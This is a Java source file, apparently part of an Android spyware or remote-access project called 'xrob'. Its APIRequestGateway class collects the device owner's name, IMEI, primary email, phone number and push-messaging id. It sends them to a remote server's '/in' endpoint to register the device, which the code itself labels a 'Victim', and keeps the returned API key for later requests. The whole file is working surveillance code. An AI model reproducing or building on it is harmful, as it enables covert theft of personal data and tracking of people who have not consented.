package com.theah64.xrob.utils;

import android.content.Context;
import android.support.annotation.Nullable;
import android.util.Log;

import com.theah64.xrob.interfaces.JobListener;
import com.theah64.xrob.models.Victim;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * All the auth needed API request must be passed through this gate way.
 * Created by theapache64 on 12/9/16.
 */
public class APIRequestGateway {

    private static final String KEY_API_KEY = "api_key";

    private static final String X = APIRequestGateway.class.getSimpleName();

    public interface APIRequestGatewayCallback {
        void onReadyToRequest(final String apiKey);
    }

    private final Context context;
    private final JobListener jobCallback;
    private final APIRequestGatewayCallback callback;

    private APIRequestGateway(Context context, @Nullable JobListener jobCallback, @Nullable APIRequestGatewayCallback callback) {
        this.context = context;
        this.jobCallback = jobCallback;
        this.callback = callback;
    }

    public APIRequestGateway(final Context context, final JobListener jobCallback) {
        this(context, jobCallback, null);
    }

    public APIRequestGateway(final Context context, final APIRequestGatewayCallback callback) {
        this(context, null, callback);
    }

    private void register(final Context context) {

        if (jobCallback != null) {
            jobCallback.onJobStart();
        }

        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();
        final String imei = profileUtils.getIMEI();
        final String email = profileUtils.getPrimaryEmail();
        final String phone = profileUtils.getPhone();
        final String fcmId = PrefUtils.getInstance(context).getString(Victim.KEY_FCM_ID);

        //Attaching them with the request
        final Request inRequest = new APIRequestBuilder("/in")
                .addParamIfNotNull(Victim.KEY_NAME, name)
                .addParam(Victim.KEY_IMEI, imei)
                .addParamIfNotNull(Victim.KEY_FCM_ID, fcmId)
                .addParamIfNotNull(Victim.KEY_EMAIL, email)
                .addParamIfNotNull(Victim.KEY_PHONE, phone)
                .build();

        //Doing API request
        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {

            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
                if (jobCallback != null) {
                    jobCallback.onJobFailed(e.getMessage());
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {

                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                    final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);

                    //Saving in preference
                    PrefUtils.getInstance(context).saveString(KEY_API_KEY, apiKey);

                    if (jobCallback != null) {
                        jobCallback.onJobFinish(apiKey);
                    }

                    if (callback != null) {
                        callback.onReadyToRequest(apiKey);
                    }

                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();
                    if (jobCallback != null) {
                        jobCallback.onJobFailed(e.getMessage());
                    }
                }
            }
        });

    }

    public void start() {

        Log.d(X, "Opening gateway...");

        if (NetworkUtils.hasNetwork(context)) {

            Log.i(X, "Has network");

            final PrefUtils prefUtils = PrefUtils.getInstance(context);
            final String apiKey = prefUtils.getString(KEY_API_KEY);

            if (apiKey != null) {

                Log.d(X, "hasApiKey " + apiKey);

                if (jobCallback != null) {
                    jobCallback.onJobFinish(apiKey);
                }

                if (callback != null) {
                    callback.onReadyToRequest(apiKey);
                }

            } else {

                Log.i(X, "Registering victim...");

                //Register victim here
                register(context);
            }

        } else {

            if (jobCallback != null) {
                jobCallback.onJobFailed("No network");
            }

            Log.e(X, "Doesn't have APIKEY and no network!");

        }
    }
}
